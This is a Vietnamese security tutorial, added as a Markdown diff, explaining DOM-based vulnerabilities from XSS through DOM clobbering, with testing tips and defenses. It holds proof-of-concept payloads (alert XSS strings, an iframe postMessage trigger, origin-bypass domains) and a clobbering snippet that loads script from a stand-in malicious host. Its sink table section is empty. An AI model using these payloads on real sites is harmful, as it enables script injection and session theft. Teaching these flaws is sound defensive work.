@@ -1,0 +1,282 @@
+---
+title: "Lỗ Hổng Dựa Trên DOM"
+description: "Phân tích toàn diện lỗ hổng dựa trên DOM — từ mô hình Source-Sink, DOM XSS, Open Redirection, Cookie Manipulation, JavaScript Injection, đến DOM Clobbering và các kỹ thuật phòng ngừa."
+date: "2026-05-07"
+category: "vulnerability"
+tags: ["dom", "xss", "dom-xss", "dom-clobbering", "javascript", "web-security"]
+thumbnail: ""
+external_link: ""
+---
+
+## 1. Tổng quan nhanh
+
+Lỗ hổng dựa trên DOM xuất hiện khi một trang web chứa các đoạn mã JavaScript xử lý dữ liệu từ người dùng một cách thiếu an toàn. Khác với các lỗ hổng truyền thống diễn ra tại máy chủ, loại lỗ hổng này xảy ra hoàn toàn bên trong trình duyệt của người dùng.
+
+Bản chất của lỗ hổng này là việc JavaScript lấy dữ liệu từ một nguồn mà kẻ tấn công có thể kiểm soát (Source) và truyền nó vào một điểm thực thi nguy hiểm (Sink). Tùy thuộc vào loại Sink, hậu quả có thể biến đổi từ việc thực thi mã độc (DOM XSS), điều hướng lừa đảo (Open Redirection), thao túng phiên làm việc, cho đến việc gây tê liệt hệ thống (Denial of Service) hoặc thay đổi hoàn toàn logic của ứng dụng thông qua việc ghi đè các biến hệ thống (DOM Clobbering).
+
+<Alert type="warning">
+Cảnh báo Đạo đức: Các thông tin và kỹ thuật trong bài viết này chỉ nhằm mục đích cung cấp kiến thức bảo mật, phục vụ cho việc nghiên cứu và kiểm thử trên các hệ thống đã được cấp phép. Tuyệt đối không sử dụng cho các mục đích vi phạm pháp luật.
+</Alert>
+
+## 2. Lỗ hổng hoạt động như thế nào?
+
+Để hiểu rõ cách thức hoạt động của lỗ hổng, chúng ta cần nắm vững cấu trúc của DOM và nguyên lý luồng dữ liệu độc hại.
+
+### 2.1. Khái niệm về DOM
+
+Mô hình đối tượng tài liệu (DOM) là cách trình duyệt web biểu diễn các thành phần trên một trang web theo sơ đồ cây phân cấp. JavaScript sử dụng DOM để thao tác với các nút và thuộc tính trên trang nhằm tạo ra các tính năng tương tác. Bản thân việc thao tác DOM là một phần tất yếu của web hiện đại, nhưng lỗ hổng sẽ nảy sinh nếu việc xử lý dữ liệu đầu vào không được kiểm soát chặt chẽ.
+
+### 2.2. Luồng di chuyển dữ liệu độc hại (Taint-flow)
+
+Mọi lỗ hổng dựa trên DOM đều có thể được truy vết thông qua luồng di chuyển dữ liệu từ nguồn vào đến điểm thực thi nguy hiểm. Quá trình này bao gồm hai thành phần cốt lõi:
+
+**Nguồn đầu vào (Source):** Đây là bất kỳ thuộc tính JavaScript nào nhận dữ liệu có khả năng bị kẻ tấn công kiểm soát.
+
+Ví dụ phổ biến nhất là đối tượng location (như `location.search` hoặc `location.hash`), cho phép kẻ tấn công kiểm soát thông qua chuỗi truy vấn hoặc phân đoạn của URL.
+
+Các nguồn khác bao gồm: đường dẫn URL (`document.URL`, `document.documentURI`), URL giới thiệu (`document.referrer`), Cookie của người dùng (`document.cookie`), tên cửa sổ (`window.name`), dữ liệu lưu trữ HTML5 (`localStorage`, `sessionStorage`), và các thông điệp Web (Web messages).
+
+**Điểm thực thi (Sink):** Đây là các hàm JavaScript hoặc đối tượng DOM có khả năng thực thi mã, tiêu tốn tài nguyên hoặc gây ra các tác động không mong muốn nếu nhận phải dữ liệu độc hại.
+
+Ví dụ: Hàm `eval()` xử lý đối số dưới dạng mã JavaScript, thuộc tính `window.location` cho phép điều hướng trình duyệt, hoặc hàm `RegExp()` có thể gây tiêu tốn tài nguyên CPU.
+
+## 3. Các biến thể và Phân loại
+
+Lỗ hổng dựa trên DOM rất đa dạng và được phân loại dựa trên loại Sink mà dữ liệu đi tới:
+
+- **DOM-based XSS:** Dữ liệu truyền vào các Sink có khả năng chạy script như `document.write()` hoặc `innerHTML`. Bao gồm cả các dạng lai như Reflected DOM XSS và Stored DOM XSS.
+- **DOM-based Open Redirection:** Ghi dữ liệu vào các Sink điều hướng như `location`, gây rủi ro lừa đảo (Phishing).
+- **DOM-based Cookie Manipulation:** Dữ liệu được ghi vào `document.cookie`, dẫn tới rủi ro cố định phiên làm việc.
+- **DOM-based JavaScript Injection:** Dữ liệu được thực thi dưới dạng mã JavaScript thông qua `eval()`, `setTimeout()`, v.v.
+- **DOM-based Document-domain Manipulation:** Dữ liệu thiết lập thuộc tính `document.domain`, cho phép lách qua Chính sách cùng nguồn gốc (SOP).
+- **DOM-based WebSocket-URL Poisoning:** Dữ liệu thiết lập địa chỉ đích cho kết nối WebSocket.
+- **DOM-based Link Manipulation:** Dữ liệu kiểm soát đích đến của các liên kết (`href`) hoặc biểu mẫu (`action`) trên trang.
+- **Web Message Manipulation:** Gửi thông điệp chứa dữ liệu độc hại qua `postMessage()` hoặc xử lý thông điệp gửi đến mà không kiểm tra nguồn gốc.
+- **DOM-based Ajax Request-header Manipulation:** Dữ liệu ghi vào các tiêu đề của yêu cầu Ajax (như `setRequestHeader()`).
+- **DOM-based Local File-path Manipulation:** Dữ liệu truyền vào các API xử lý tệp tin dưới dạng tên tệp.
+- **DOM-based Client-side SQL Injection:** Dữ liệu chèn vào các câu truy vấn SQL chạy tại trình duyệt thông qua `executeSql()`.
+- **DOM-based HTML5-storage Manipulation:** Dữ liệu độc hại được lưu vào `localStorage` hoặc `sessionStorage` để phục vụ cho các chuỗi tấn công sau đó.
+- **DOM-based Client-side XPath & JSON Injection:** Dữ liệu chèn vào câu truy vấn XPath (`document.evaluate()`) hoặc phân tích cú pháp JSON (`JSON.parse()`).
+- **DOM-data Manipulation:** Ghi dữ liệu vào các trường hiển thị hoặc logic phía máy khách (`script.src`, `element.setAttribute()`).
+- **DOM-based Denial of Service (DoS):** Truyền dữ liệu vào các API hệ thống gây tiêu tốn quá mức tài nguyên CPU hoặc ổ đĩa (`RegExp()`, `requestFileSystem()`).
+- **DOM Clobbering:** Kỹ thuật nâng cao chèn các phần tử HTML để ghi đè các biến toàn cục hoặc thuộc tính của đối tượng trong JavaScript.
+
+## 4. Hướng dẫn khai thác thực tế
+
+### 4.1. Khai thác DOM-based XSS
+
+Lỗ hổng xảy ra khi dữ liệu truyền đến các Sink thực thi mã.
+
+**Sink `document.write`:** Chấp nhận các phần tử thẻ script.
+
+```javascript
+document.write('... <script>alert(document.domain)</script> ...');
+```
+
+**Sink `innerHTML`:** Trình duyệt hiện đại không cho phép thực thi thẻ `<script>` qua Sink này. Kẻ tấn công phải sử dụng các thẻ như `<img>` hoặc `<iframe>` kết hợp với sự kiện `onerror` / `onload`.
+
+```javascript
+element.innerHTML='... <img src=1 onerror=alert(document.domain)> ...'
+```
+
+**Khai thác qua thư viện thứ ba (jQuery):** Hàm `attr()` thay đổi thuộc tính `href` thành URL chứa mã độc:
+
+```javascript
+$(function() {
+$('#backLink').attr("href",(new URLSearchParams(window.location.search)).get('returnUrl'));
+});
+// Khai thác: ?returnUrl=javascript:alert(document.domain)
+```
+
+**Bộ chọn `$()` kết hợp với sự kiện `hashchange` tự động cuộn trang:**
+
+```javascript
+$(window).on('hashchange', function() {
+var element = $(location.hash);
+element[0].scrollIntoView();
+});
+```
+
+Kẻ tấn công sử dụng iframe để kích hoạt tự động mà không cần người dùng nhấp chuột:
+
+```html
+<iframe src="https://vulnerable-website.com#" onload="this.src+='<img src=1 onerror=alert(1)>'">
+```
+
+**Khai thác qua AngularJS:** Nếu trang web sử dụng thuộc tính `ng-app`, kẻ tấn công có thể thực thi mã trực tiếp bên trong dấu ngoặc nhọn kép `{{ }}` mà không cần thẻ HTML.
+
+**Reflected & Stored DOM XSS:** Dữ liệu từ máy chủ được phản chiếu hoặc lưu trữ, sau đó JavaScript ở phía máy khách xử lý thiếu an toàn:
+
+```javascript
+eval('var data = "reflected string"'); // Reflected DOM XSS
+element.innerHTML = comment.author;    // Stored DOM XSS
+```
+
+### 4.2. Khai thác Mở điều hướng trái phép (Open Redirection)
+
+Lỗ hổng phát sinh khi mã kịch bản ghi dữ liệu vào một Sink điều hướng chéo tên miền:
+
+```javascript
+let url = /https?:\/\/.+/.exec(location.hash);
+if (url) {
+  location = url[0];
+}
+```
+
+Tác động: Kẻ tấn công lừa nạn nhân truy cập URL (Ví dụ: `https://www.innocent-website.com/example#https://www.evil-user.net`), từ đó điều hướng họ sang trang web lừa đảo. Nếu kẻ tấn công kiểm soát được phần đầu của chuỗi, họ có thể dùng giao thức `javascript:` để leo thang thành Tiêm mã JavaScript.
+
+### 4.3. Khai thác Thao túng Cookie (Cookie Manipulation)
+
+Biến dữ liệu Cookie thành một nguồn độc hại:
+
+```javascript
+document.cookie = 'cookieName='+location.hash.slice(1);
+```
+
+Tác động: Kẻ tấn công gán các giá trị tùy ý vào Cookie của nạn nhân, gây rủi ro Cố định phiên (Session Fixation) hoặc chèn mã XSS nếu ứng dụng sau đó phản chiếu giá trị Cookie lên màn hình mà không mã hóa HTML.
+
+### 4.4. Khai thác Tiêm mã JavaScript (JavaScript Injection)
+
+Khi dữ liệu được truyền vào các Sink như `eval()`, `setTimeout()`.
+
+Tác động: Mã do kẻ tấn công cung cấp có thể thực hiện nhiều hành động nguy hiểm, chẳng hạn như đánh cắp mã thông báo phiên, thông tin đăng nhập hoặc thậm chí ghi lại thao tác bàn phím (keylogging) của nạn nhân.
+
+### 4.5. Khai thác Thao túng Document-domain
+
+Lỗ hổng cho phép thiết lập giá trị `document.domain`.
+
+Tác động: Thuộc tính này được trình duyệt dùng để thực thi SOP. Nếu kẻ tấn công ép trang mục tiêu và một trang họ kiểm soát sử dụng cùng giá trị `document.domain` (ví dụ sử dụng tên miền con có bảo mật yếu), họ có thể phá vỡ hoàn toàn SOP và thao túng trang mục tiêu.
+
+### 4.6. Khai thác Độc nội dung URL WebSocket (WebSocket-URL Poisoning)
+
+Xảy ra khi dữ liệu người dùng xác định địa chỉ đích của kết nối WebSocket.
+
+Tác động: Trình duyệt mở kết nối WebSocket đến máy chủ do kẻ tấn công kiểm soát. Nếu ứng dụng truyền dữ liệu nhạy cảm qua WebSocket, kẻ tấn công sẽ bắt được toàn bộ. Nếu ứng dụng đọc dữ liệu, kẻ tấn công có thể chèn các phản hồi độc hại để thao túng logic.
+
+### 4.7. Khai thác Thao túng liên kết (Link Manipulation)
+
+Mã kịch bản ghi dữ liệu vào mục tiêu điều hướng trong trang hiện tại (như `element.href` hoặc URL gửi biểu mẫu `element.action`).
+
+Tác động: Kẻ tấn công có thể điều hướng người dùng đến URL lừa đảo, ép gửi dữ liệu biểu mẫu nhạy cảm đến máy chủ của họ, hoặc vượt qua cơ chế chống XSS của trình duyệt bằng cách chèn các liên kết nội bộ chứa mã độc (do hệ thống chống XSS thường không kiểm tra liên kết nội bộ).
+
+### 4.8. Khai thác Thông điệp Web (Web Message Manipulation & Source)
+
+**Gửi đi thiếu an toàn:** Mã kịch bản gửi dữ liệu độc hại qua thông điệp Web tới một tài liệu khác trong trình duyệt.
+
+**Nhận vào thiếu an toàn (Web Message Source):** Trang web nhận thông điệp qua sự kiện `message` nhưng không xác thực nguồn gốc:
+
+```javascript
+window.addEventListener('message', function(e) { eval(e.data); });
+```
+
+Kẻ tấn công sử dụng iframe để ép trình duyệt nạn nhân gửi mã độc:
+
+```html
+<iframe src="https://vulnerable-website.com" onload="this.contentWindow.postMessage('print()','*')">
+```
+
+**Vượt rào kiểm tra nguồn gốc:** Lập trình viên thường sử dụng sai thuật toán so khớp chuỗi:
+
+- Sử dụng `indexOf()`: Lách qua bằng tên miền phụ (Ví dụ: `http://www.normal-website.com.evil.net`).
+- Sử dụng `endsWith()`: Lách qua bằng tên miền ghép (Ví dụ: `http://www.malicious-websitenormal-website.com`).
+
+### 4.9. Khai thác Thao túng Header yêu cầu Ajax
+
+Kịch bản ghi dữ liệu vào tiêu đề yêu cầu Ajax được phát hành qua XmlHttpRequest.
+
+Tác động: Kẻ tấn công thiết lập một tiêu đề tùy ý trong yêu cầu Ajax tiếp theo. Điều này được sử dụng làm điểm khởi đầu để thao túng hành vi xử lý phía máy chủ và kết nối thành chuỗi tấn công phức tạp hơn.
+
+### 4.10. Khai thác Thao túng đường dẫn tệp cục bộ
+
+Dữ liệu được truyền vào API xử lý tệp như tham số filename (Ví dụ: thông qua FileReader).
+
+Tác động: Ép trình duyệt của người dùng mở một tệp cục bộ. Kẻ tấn công có thể trích xuất dữ liệu từ tệp hoặc ghi đè dữ liệu riêng của họ vào một tệp nhạy cảm (như tệp cấu hình hệ điều hành).
+
+### 4.11. Khai thác Client-side SQL Injection
+
+Dữ liệu kết hợp vào câu truy vấn SQL phía máy khách một cách thiếu an toàn.
+
+Tác động: Thực thi câu lệnh SQL tùy ý trên cơ sở dữ liệu trình duyệt (SQLite/WebSQL). Kẻ tấn công có thể đánh cắp dữ liệu nhạy cảm hoặc sửa đổi các hành động đang chờ xử lý của người dùng.
+
+### 4.12. Khai thác Thao túng lưu trữ HTML5
+
+Dữ liệu được lưu trữ trong `localStorage` hoặc `sessionStorage`. Hành vi này không phải là lỗi trực tiếp, nhưng nếu ứng dụng sau đó đọc lại dữ liệu và xử lý thiếu an toàn, nó đóng vai trò là bàn đạp để thực hiện DOM XSS hoặc JS Injection.
+
+### 4.13. Khai thác XPath và JSON Injection
+
+**XPath Injection:** Chèn dữ liệu vào câu truy vấn XPath (`document.evaluate()`), cho phép kẻ tấn công trích xuất dữ liệu khác với dự kiến hoặc phá vỡ logic trang web.
+
+**JSON Injection:** Dữ liệu được đưa vào chuỗi và được phân tích bằng `JSON.parse()`. Kẻ tấn công phá vỡ cấu trúc JSON để thao túng các hành động dưới danh nghĩa người dùng.
+
+### 4.14. Khai thác Thao túng dữ liệu DOM
+
+Dữ liệu được ghi vào các trường hiển thị (UI) hoặc logic phía máy khách.
+
+Tác động: Ở mức độ nhẹ, dẫn đến việc thay đổi giao diện (virtual defacement). Ở mức độ nguy hiểm, thay đổi thuộc tính `src` của một phần tử để nhập một tệp JavaScript độc hại bên ngoài.
+
+### 4.15. Khai thác Từ chối dịch vụ (Denial of Service)
+
+Dữ liệu được truyền thiếu an toàn vào các API nền tảng có vấn đề.
+
+Tác động: Truyền chuỗi cực lớn vào `RegExp()` hoặc `requestFileSystem()` gây tiêu thụ quá mức tài nguyên CPU hoặc không gian đĩa, khiến trình duyệt phải đóng băng các đoạn mã kịch bản.
+
+### 4.16. Khai thác DOM Clobbering
+
+Kỹ thuật tiêm mã HTML để ghi đè các biến toàn cục trong JavaScript (thường là để thay thế các tham chiếu đối tượng an toàn bằng một phần tử DOM).
+
+```javascript
+window.onload = function(){
+  let someObject = window.someObject || {};
+  let script = document.createElement('script');
+  script.src = someObject.url; // Sink nguy hiểm
+  document.body.appendChild(script);
+};
+```
+
+Kẻ tấn công chèn các phần tử HTML có thuộc tính `id` trùng tên để chiếm quyền biến `someObject` và gán thuộc tính `url`:
+
+```html
+<a id="someObject"></a><a id="someObject" name="url" href="//malicious-website.com/evil.js"></a>
+```
+
+**Vượt rào bộ lọc HTML:**
+
+```html
+<form onclick=alert(1)><input id=attributes>Click me</form>
+```
+
+Thuộc tính `attributes` của thẻ `<form>` bị ghi đè bởi thẻ `<input>`. Các bộ lọc JavaScript duyệt qua `element.attributes.length` sẽ kiểm tra `<input>` thay vì `<form>`, qua đó bỏ sót thuộc tính độc hại `onclick`.
+
+## 5. Checklist Kiểm thử và Nhận diện
+
+### 5.1. Phương pháp kiểm thử thủ công
+
+**Kiểm tra HTML Sinks:** Chèn chuỗi ký tự ngẫu nhiên vào Source (ví dụ: `location.search`). Mở công cụ DevTools của trình duyệt (không sử dụng tính năng View Source mặc định vì nó không hiển thị DOM động) và tìm chuỗi đó. Xem xét ngữ cảnh (nằm trong thuộc tính hay nội dung thẻ) để xây dựng payload thoát khỏi cấu trúc hiện tại.
+
+**Kiểm tra JavaScript execution Sinks:** Dữ liệu thường không xuất hiện trên DOM. Tìm mã JavaScript tham chiếu Source (Ctrl+Shift+F trong DevTools). Sử dụng JavaScript Debugger để đặt điểm dừng (Breakpoint) và theo dõi giá trị biến trước khi truyền vào Sink.
+
+**Lưu ý về URL-Encoding:** Trình duyệt Chrome, Firefox, Safari tự động mã hóa `location.search` và `location.hash`. Tuy nhiên, IE11 và Microsoft Edge (bản cũ) không thực hiện mã hóa này.
+
+**Tự động hóa:** Khuyến nghị sử dụng công cụ DOM Invader tích hợp trong Burp Suite để phân tích các đoạn mã JavaScript phức tạp. Đối với DOM-data manipulation, tính năng quét tĩnh thường sinh ra cảnh báo giả (false positives), cần xác minh thủ công.
+
+### 5.2. Bảng tổng hợp các Sink (Điểm thực thi) toàn diện
+
+## 6. Cách phòng ngừa và Khắc phục
+
+Để ngăn chặn lỗ hổng dựa trên DOM, nhà phát triển cần tuân thủ triết lý phòng thủ nhiều lớp:
+
+**Nguyên tắc cốt lõi:** Tuyệt đối không cho phép dữ liệu từ bất kỳ nguồn không tin cậy (untrusted source) nào thay đổi trực tiếp các giá trị truyền đến các Sink. Hạn chế tối đa việc ghi dữ liệu động vào tài liệu HTML hoặc các API hệ thống có rủi ro cao.
+
+**Tham số hóa Truy vấn (Parameterized Queries):** Đối với Client-side SQL Injection, bắt buộc sử dụng hai bước chuẩn bị cấu trúc truy vấn: định nghĩa cấu trúc và sử dụng dấu `?` làm trình giữ chỗ (placeholder) trong hàm `executeSql()`, sau đó truyền tham số vào riêng biệt.
+
+**Danh sách cho phép (Whitelist):** Luôn xác thực nội dung đầu vào dựa trên một danh sách các giá trị hoặc tên miền được đánh giá là an toàn (áp dụng đặc biệt cho điều hướng, liên kết, tải tệp tin).
+
+**Xác thực Thông điệp Web nghiêm ngặt:** Khi nhận dữ liệu từ sự kiện `message`, phải kiểm tra nguồn gốc bằng phép toán so sánh chính xác tuyệt đối (`===`), không sử dụng các phương thức `indexOf()`, `startsWith()` hay `endsWith()`. Khi gửi thông điệp chéo nguồn gốc, luôn chỉ định rõ ràng cửa sổ mục tiêu (target window).
+
+**Phòng chống DOM Clobbering:**
+
+- Kiểm tra tính hợp lệ của đối tượng hoặc hàm (Ví dụ: Sử dụng `instanceof NamedNodeMap` để đảm bảo thuộc tính `attributes` thực sự là dữ liệu hệ thống).
+- Tránh mã hóa tồi (Bad code patterns): Không tham chiếu biến toàn cục kết hợp với toán tử logic `||`.
+- Sử dụng thư viện bảo mật chuyên dụng: Sử dụng thư viện đã được kiểm chứng tốt như DOMPurify để tính toán xử lý rủi ro DOM Clobbering khi làm sạch HTML.
+
+**Mã hóa và Làm sạch dữ liệu:** Nếu bắt buộc phải sử dụng dữ liệu động, hãy áp dụng một chuỗi quy trình làm sạch kết hợp: JavaScript escaping, HTML encoding và URL encoding theo đúng thứ tự tùy thuộc vào ngữ cảnh lưu trữ và hiển thị của dữ liệu.
